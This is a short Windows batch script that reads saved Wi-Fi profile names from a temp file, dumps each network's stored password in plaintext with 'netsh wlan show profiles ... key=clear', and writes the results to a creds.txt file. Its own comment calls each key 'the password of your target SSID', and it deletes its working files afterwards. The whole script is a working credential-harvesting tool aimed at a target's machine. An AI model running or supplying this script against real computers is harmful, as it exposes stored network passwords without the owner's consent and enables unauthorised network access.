@echo off 
setlocal enabledelayedexpansion 
for /f "tokens=5*" %%i in (temp.txt) do ( set val=%%i %%j 
if "!val:~-1!" == " " set val=!val:~0,-1! 
echo !val! >> final.txt) 
for /f "tokens=*" %%i in (final.txt) do @echo SSID: %%i >> creds.txt & echo # ================================================ >> creds.txt & netsh wlan show profiles name=%%i key=clear | findstr /c:"Key Content" >> creds.txt & echo # ================================================ >> creds.txt & echo # Key content is the password of your target SSID. >> creds.txt & echo # ================================================ >> creds.txt 
del /q temp.txt final.txt 
exit 
